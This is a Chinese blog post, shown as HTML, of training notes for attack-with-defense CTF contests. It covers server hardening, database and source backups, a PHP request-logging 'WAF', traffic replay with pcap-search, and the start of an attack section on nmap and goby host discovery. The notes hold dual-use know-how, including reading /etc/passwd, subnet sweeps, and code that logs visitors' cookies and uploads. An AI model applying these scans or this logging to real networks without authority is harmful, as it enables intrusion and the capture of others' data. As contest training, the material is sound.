@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"apsry.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="要去给别人培训，所以总结了下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AWD培训">
+<meta property="og:url" content="https://apsry.github.io/2022/04/30/AWD%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%AE%88/index.html">
+<meta property="og:site_name" content="apsry">
+<meta property="og:description" content="要去给别人培训，所以总结了下">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.programminghunter.com/images/662/f9/f97ebcae2cec70972110c54d80978516.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204252212320.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204252212419.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204252311142.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204252311133.png">
+<meta property="article:published_time" content="2022-04-30T07:26:00.000Z">
+<meta property="article:modified_time" content="2022-04-30T12:22:25.722Z">
+<meta property="article:author" content="apsry">
+<meta property="article:tag" content="AWD">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.programminghunter.com/images/662/f9/f97ebcae2cec70972110c54d80978516.png">
+
+<link rel="canonical" href="https://apsry.github.io/2022/04/30/AWD%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%AE%88/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>AWD培训 | apsry</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+<!-- 引入目录截取js -->
+<script type="text/javascript" src="/js/src/abstract.js"></script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">apsry</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">去留无意，宠辱不惊</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://apsry.github.io/2022/04/30/AWD%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%AE%88/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="apsry">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="apsry">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          AWD培训
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-04-30 15:26:00 / 修改时间：20:22:25" itemprop="dateCreated datePublished" datetime="2022-04-30T15:26:00+08:00">2022-04-30</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>要去给别人培训，所以总结了下</p>
+<span id="more"></span>
+
+
+
+
+
+<h1 id="AWD赛制"><a href="#AWD赛制" class="headerlink" title="AWD赛制"></a>AWD赛制</h1><p>百度百科：<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/AWD%E8%B5%9B%E5%88%B6/24705704">https://baike.baidu.com/item/AWD%E8%B5%9B%E5%88%B6/24705704</a></p>
+<p>通过别人的实战理解比较好：<a target="_blank" rel="noopener" href="https://err0r.top/article/2021ciscnawd/">https://err0r.top/article/2021ciscnawd/</a></p>
+<p><img src="https://www.programminghunter.com/images/662/f9/f97ebcae2cec70972110c54d80978516.png" alt="img"></p>
+<p>比赛形式</p>
+<ol>
+<li>比赛开始前会给每支队伍分配 SSH 账号，比赛开始用该账号登录服务器进行维护（多为 Linux 服务器）。</li>
+<li>在服务器的某处有一个 flag 文件，默认没有权限修改，一般在根目录下。</li>
+<li>主办方每隔一定时间，进行一轮刷新。一轮内一支队伍的 flag 只能被提交一次，flag 一旦被拿走将扣除该队的分数。</li>
+<li>主办方会对服务进行 check，一般的判断标准就是服务是否还存在。</li>
+</ol>
+<p>扣除的积分由获取 flag 的队伍均分。</p>
+<p>一般一个队伍由三人组成。负责两个方面：一方面负责防守加固、做基线、加WAF、流量回放等等。一方面负责源码审计、写攻击脚本、维持权限、持续渗透，具体怎么安排都视三人能力而定。</p>
+<h1 id="AWD前期准备"><a href="#AWD前期准备" class="headerlink" title="AWD前期准备"></a>AWD前期准备</h1><h2 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h2><h3 id="检查可登陆用户"><a href="#检查可登陆用户" class="headerlink" title="检查可登陆用户"></a>检查可登陆用户</h3><ul>
+<li><code>cat /etc/passwd|grep -v nologin</code></li>
+</ul>
+<h3 id="修改ssh密码"><a href="#修改ssh密码" class="headerlink" title="修改ssh密码"></a>修改ssh密码</h3><p>因为给的ssh密码可能是弱口令或者有规律</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">passwd username</span><br><span class="line"># 输入密码确认即可</span><br></pre></td></tr></table></figure>
+
+<h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><h3 id="检查crontab执行权限"><a href="#检查crontab执行权限" class="headerlink" title="检查crontab执行权限"></a>检查crontab执行权限</h3><ul>
+<li><code>/var/adm/cron/</code> 下看<code>cron.allow</code> 和<code>cron.deny</code>， 如果两个文件都不存在，则只有root 用户能执行crontab 命令，allow 里存放允许的用户，deny 里存放拒绝的用户，以allow 为准。</li>
+</ul>
+<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><h3 id="修改数据库密码及备份数据库（以-mysql-为例）"><a href="#修改数据库密码及备份数据库（以-mysql-为例）" class="headerlink" title="修改数据库密码及备份数据库（以 mysql 为例）"></a>修改数据库密码及备份数据库（以 mysql 为例）</h3><p>修改 mysql 密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1. 登录 mysql 终端，运行：</span><br><span class="line">mysql&gt; set password=password(&#x27;new passwd&#x27;);</span><br><span class="line">mysql&gt;flush privileges;</span><br><span class="line">2. 修改 mysql user 表</span><br><span class="line">mysql&gt;use mysql;</span><br><span class="line">mysql&gt;update user set password=password(&#x27;new password&#x27;) where user=&#x27;root&#x27;;</span><br><span class="line">mysql&gt;flush privileges;</span><br><span class="line">3. 使用 GRANT 语句</span><br><span class="line">mysql&gt;GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;127.0.0.1&#x27; IDENTIFIED BY &#x27;new password&#x27; WITH GRANT OPTION;</span><br><span class="line">mysql&gt;flush privileges;</span><br><span class="line">4. mysqladmin</span><br><span class="line">[root@ubuntu]# mysqladmin -u root passwd &quot;new passwd&quot;;（注意双引号或不加）</span><br></pre></td></tr></table></figure>
+
+<p>备份指定的多个数据库</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[root@ubuntu]</span># mysqldump -u root -<span class="selector-tag">p</span> <span class="attr">--databases</span> databasesname &gt; /tmp/db<span class="selector-class">.sql</span></span><br></pre></td></tr></table></figure>
+
+<p>数据库恢复，在mysql终端下执行</p>
+<h3 id="备份-x2F-还原数据库"><a href="#备份-x2F-还原数据库" class="headerlink" title="备份&#x2F;还原数据库"></a>备份&#x2F;还原数据库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -proot -e <span class="string">&quot;select user,host from mysql.user;&quot;</span></span><br><span class="line">mysqldump -uroot -proot db_name &gt; /tmp/bak.sql</span><br><span class="line">mysqldump -uroot -proot --all-databases &gt; bak.sql</span><br><span class="line">mysql -uroot -proot db_name &lt; bak.sql</span><br><span class="line">&gt;	<span class="built_in">source</span> bak.sql		<span class="comment"># 交互模式下导入sql</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="关闭mysql远程连接"><a href="#关闭mysql远程连接" class="headerlink" title="关闭mysql远程连接"></a>关闭mysql远程连接</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql <span class="operator">-</span>u root <span class="operator">-</span>p</span><br><span class="line">mysql<span class="operator">&gt;</span> use mysql;</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> host <span class="operator">=</span> <span class="string">&#x27;localhost&#x27;</span> <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span> <span class="keyword">and</span> host<span class="operator">=</span><span class="string">&#x27;%&#x27;</span>;</span><br><span class="line">mysql<span class="operator">&gt;</span> flush privileges;</span><br><span class="line">mysql<span class="operator">&gt;</span> exit;</span><br></pre></td></tr></table></figure>
+
+<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><h3 id="源码备份"><a href="#源码备份" class="headerlink" title="源码备份"></a>源码备份</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">打包目录</span></span><br><span class="line">tar -zcvf archive_name.tar.gz directory_to_compress</span><br><span class="line"><span class="meta"># </span><span class="language-bash">解包</span></span><br><span class="line">tar -zxvf archive_name.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>之后使用 scp 命令或者 winscp，mobaxterm 等工具下载打包后的源码</p>
+<h3 id="上-WAF"><a href="#上-WAF" class="headerlink" title="上 WAF"></a>上 WAF</h3><p>注意waf可能会把check给拦了，这个时候记得把waf关了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">批量加waf /var/www/html/ 目录下每个 php 文件前加上 &lt;?php require_once <span class="string">&quot;/tmp/waf.php&quot;</span>;?&gt;</span></span><br><span class="line">find /var/www/html -path /var/www/html -prune -o  -type f -name &#x27;*.php&#x27;|xargs  sed -i &#x27;1i&lt;?php require_once &quot;/tmp/waf.php&quot;;?&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>也可以修改 php.ini 的 auto_prepend_file 属性，但一般不会有重启 php 服务权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">; Automatically add files before PHP document.</span><br><span class="line">; http://php.net/auto-prepend-file</span><br><span class="line">auto_prepend_file = /tmp/waf.php</span><br></pre></td></tr></table></figure>
+
+<p>附上郁离歌的一枚 WAF，会在 <code>/tmp/loooooooogs</code> 目录下生成日志文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;LOG_FILEDIR&#x27;</span>,<span class="string">&#x27;/tmp/loooooooogs&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(LOG_FILEDIR))&#123;</span><br><span class="line">	<span class="title function_ invoke__">mkdir</span>(LOG_FILEDIR);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;getallheaders&#x27;</span>)) &#123; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getallheaders</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_SERVER</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$value</span>) &#123; </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="number">0</span>, <span class="number">5</span>) == <span class="string">&#x27;HTTP_&#x27;</span>) </span><br><span class="line"><span class="variable">$headers</span>[<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="title function_ invoke__">ucwords</span>(<span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, <span class="number">5</span>)))))] = <span class="variable">$value</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="variable">$headers</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$get</span> = <span class="variable">$_GET</span>; </span><br><span class="line"><span class="variable">$post</span> = <span class="variable">$_POST</span>; </span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_COOKIE</span>; </span><br><span class="line"><span class="variable">$header</span> = <span class="title function_ invoke__">getallheaders</span>(); </span><br><span class="line"><span class="variable">$files</span> = <span class="variable">$_FILES</span>; </span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]; </span><br><span class="line"><span class="variable">$method</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>]; </span><br><span class="line"><span class="variable">$filepath</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_NAME&quot;</span>]; </span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_FILES</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123; </span><br><span class="line"><span class="variable">$files</span>[<span class="variable">$key</span>][<span class="string">&#x27;content&#x27;</span>] = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="variable">$key</span>][<span class="string">&#x27;tmp_name&#x27;</span>]); </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_FILES</span>[<span class="variable">$key</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&quot;virink&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$header</span>[<span class="string">&#x27;Accept&#x27;</span>]);</span><br><span class="line"><span class="variable">$input</span> = <span class="keyword">array</span>(<span class="string">&quot;Get&quot;</span>=&gt;<span class="variable">$get</span>, <span class="string">&quot;Post&quot;</span>=&gt;<span class="variable">$post</span>, <span class="string">&quot;Cookie&quot;</span>=&gt;<span class="variable">$cookie</span>, <span class="string">&quot;File&quot;</span>=&gt;<span class="variable">$files</span>, <span class="string">&quot;Header&quot;</span>=&gt;<span class="variable">$header</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">logging</span>(<span class="variable">$input</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logging</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$LOG_FILENAME</span> = LOG_FILEDIR.<span class="string">&quot;/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d G:i:s&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$LOG_FILENAME</span>, <span class="string">&quot;\r\n&quot;</span>.<span class="variable">$time</span>.<span class="string">&quot;\r\n&quot;</span>.<span class="title function_ invoke__">print_r</span>(<span class="variable">$var</span>, <span class="literal">true</span>), FILE_APPEND); </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$LOG_FILENAME</span>,<span class="string">&quot;\r\n&quot;</span>.<span class="string">&#x27;http://&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>].<span class="string">&#x27;?&#x27;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], FILE_APPEND);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$LOG_FILENAME</span>,<span class="string">&quot;\r\n***************************************************************&quot;</span>,FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">waf</span>(); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>生成的日志是 www-data 权限，一般 ctf 权限是删除不了的。上好 WAF 之后做好打包备份，除了源文件一份备份，我一般上好 WAF ，打好补丁还会做备份。</p>
+<h3 id="一些软waf"><a href="#一些软waf" class="headerlink" title="一些软waf"></a>一些软waf</h3><p>软waf部署起来比较麻烦，而且对环境要求高，所以用来借鉴就可以了。如果合适的话可以布置。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/admintony/Prepare-for-AWD">https://github.com/admintony/Prepare-for-AWD</a></p>
+<h4 id="PHP软waf"><a href="#PHP软waf" class="headerlink" title="PHP软waf"></a>PHP软waf</h4><ul>
+<li>项目地址：<a target="_blank" rel="noopener" href="https://github.com/leohearts/awd-watchbird/">https://github.com/leohearts/awd-watchbird/</a></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/leohearts/awd-watchbird</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将waf.so、watchbird.php文件存放在<code>/var/www/html</code>或其他目录中。</li>
+<li>将watchbird.php放在www-data可读的目录, 确保当前用户对目标目录可写, 然后执行。</li>
+</ul>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php watchbird.php <span class="params">--install</span> <span class="string">/web</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>访问任意启用了waf的文件, 参数<code>?watchbird=ui</code>。</li>
+<li>如需卸载, 请在相同的位置输入：</li>
+</ul>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php watchbird<span class="selector-class">.php</span> <span class="attr">--uninstall</span> <span class="selector-attr">[Web目录]</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="pcap-search"><a href="#pcap-search" class="headerlink" title="pcap-search"></a>pcap-search</h4><ul>
+<li><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/ss8651twtw/pcap-search">https://github.com/ss8651twtw/pcap-search</a></p>
+</li>
+<li><p>首先在kali中安装docker：</p>
+</li>
+<li><p>使用docker的官方教程安装失败，报错<code>Updating from such a repository can&#39;t be done securely, and is therefore disabled by default.</code>。</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -</span><br><span class="line">sudo sh -c <span class="string">&quot;echo &#x27;deb https://download.docker.com/linux/debian stretch stable&#x27; &gt; /etc/apt/sources.list.d/docker.list&quot;</span></span><br><span class="line">sudo apt-get install apt-transport-https ca-certificates curl gnupg2 software-properties-common</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>安装pcap-search：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ss8651twtw/pcap-search.git</span><br><span class="line"><span class="built_in">cd</span> pcap-search/docker</span><br><span class="line">./build_docker.sh</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>运行pcap-search后，使用指定的端口即可访问：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./run_docker.sh [the pcap directory you want to mount] [port] [name]</span><br><span class="line">./run_docker.sh /home/secc/Desktop/cap 8080 pcap-search</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>抓包：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-l:<span class="number">9875</span>,fork exec:<span class="regexp">/home/</span>secc<span class="regexp">/Desktop/</span>ciscn_2019_es_2</span><br><span class="line">tcpdump -i eth1 port <span class="number">9875</span> -w <span class="number">1</span>.cap	<span class="comment"># 注意这里一定要指定网卡（-i eth1)，使用-i any是解析不出来的</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>打完流量后，按Ctrl+C停止抓包，并保存流量包文件。</li>
+</ul>
+</li>
+<li><p>将流量包建在二级目录下：</p>
+<ul>
+<li>将我们之前运行时指定的目录看作为根目录的话，需要在根目录下再新建一个文件夹，例如项目“pwn1”。将生成的cap文件拷贝到文件夹中，项目自己会自动生存<code>cap.ap</code>和<code>cap.ap.fm</code>文件。再次访问网页就可以查询到包中的流量了。</li>
+</ul>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cap</span></span><br><span class="line">└── pwn1</span><br><span class="line">    ├── 1.<span class="keyword">cap</span></span><br><span class="line">    ├── 1.<span class="keyword">cap</span>.<span class="keyword">ap</span></span><br><span class="line">    └── 1.<span class="keyword">cap</span>.<span class="keyword">ap</span>.fm</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204252212320.png" alt="image-20210901201301492"></p>
+<ul>
+<li>可以根据流量包自动生成脚本重放（由于只是对流量的完全重放，所以如果有泄露地址，这个功能就有些鸡肋了）：</li>
+</ul>
+<img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202204252212419.png" alt="image-20210901194633454" style="zoom:33%;" />
+
+<h1 id="AWD攻击"><a href="#AWD攻击" class="headerlink" title="AWD攻击"></a>AWD攻击</h1><h2 id="快速主机发现"><a href="#快速主机发现" class="headerlink" title="快速主机发现"></a>快速主机发现</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>nmap -sn 192.168.0.0&#x2F;24</p>
+<h3 id="goby-masscan"><a href="#goby-masscan" class="headerlink" title="goby+masscan"></a>goby+masscan</h3><p>goby</p>
+<p><a target="_blank" rel="noopener" href="https://gobies.org/">https://gobies.org/</a></p>
+<p>可以结合goby商城下载msscan，扫的更快</p>
+<h3 id="根据自己主机开放的端口"><a href="#根据自己主机开放的端口" class="headerlink" title="根据自己主机开放的端口"></a>根据自己主机开放的端口</h3><p>简单来说，大家的主机配置都是一样的，所以主机开了什么端口，其它的目标机器也开了什么端口，直接扫相同的端口即可</p>
